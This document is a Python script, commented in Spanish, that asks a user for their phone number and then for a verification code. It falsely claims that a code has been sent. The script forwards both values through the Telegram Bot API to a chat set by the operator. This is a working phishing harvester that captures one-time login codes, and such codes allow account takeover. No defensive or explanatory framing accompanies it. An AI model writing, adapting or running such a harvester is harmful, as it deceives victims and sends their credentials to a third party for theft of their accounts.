import requests
import telebot

# Reemplaza 'TU_TOKEN' con el token de tu bot de Telegram
TOKEN = 'TU_TOKEN'
bot = telebot.TeleBot(TOKEN)

def enviar_telefono(chat_id, telefono):
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    payload = {
        'chat_id': chat_id,
        'text': f'Número de teléfono recibido: {telefono}'
    }
    response = requests.post(url, data=payload)
    return response.json()

def enviar_codigo(chat_id, codigo):
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    payload = {
        'chat_id': chat_id,
        'text': f'Código recibido: {codigo}'
    }
    response = requests.post(url, data=payload)
    return response.json()

def main():
    chat_id = 'TU_CHAT_ID'  # Reemplaza con el chat_id al que deseas enviar los mensajes
    print("Introduce tu número de teléfono:")
    telefono = input()
    enviar_telefono(chat_id, telefono)

    print("Se ha enviado un código a tu número de teléfono. Introduce el código recibido:")
    codigo = input()
    enviar_codigo(chat_id, codigo)

if __name__ == "__main__":
    main()